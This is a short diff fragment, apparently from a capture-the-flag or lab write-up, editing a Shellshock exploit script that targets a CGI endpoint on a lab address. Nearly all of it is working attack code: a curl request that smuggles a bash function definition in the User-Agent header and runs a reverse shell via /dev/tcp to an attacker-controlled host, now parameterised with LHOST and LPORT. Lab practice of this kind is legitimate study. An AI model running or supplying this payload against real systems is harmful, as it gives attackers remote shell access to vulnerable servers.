@@ -253,7 +253,7 @@ LPORT=$2
 
 TARGET="http://10.10.10.56/cgi-bin/user.sh"
 
-PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.192/12345 0>&1'"
+PAYLOAD="/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
 
 curl -H "User-Agent: () { :; }; echo; echo; ${PAYLOAD}" ${TARGET}
 ```
